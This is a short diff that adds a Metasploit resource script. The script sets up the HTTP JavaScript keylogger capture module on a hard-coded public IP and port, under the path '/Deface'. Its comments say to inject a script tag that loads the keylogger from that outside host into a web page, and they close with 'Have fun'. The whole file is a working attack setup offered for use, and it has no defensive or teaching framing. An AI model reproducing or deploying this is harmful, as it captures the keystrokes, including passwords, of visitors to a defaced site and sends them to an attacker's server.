@@ -1,0 +1,11 @@
+use auxiliary/server/capture/http_javascript_keylogger
+set demo true
+set SRVHOST 35.20.144.195
+set SERVPOST 8080
+set URIPATH /Deface
+run
+
+# This will give you a http url to your listener, like http://35.20.144.195:8080/a4Slh7t. #Then, all you have to do is: 
+# <script type="text/javascript" src="http://35.20.144.195:8080/a4Slh7t/test.js"> </script>
+
+# Your msf will be listenning now. Have fun 
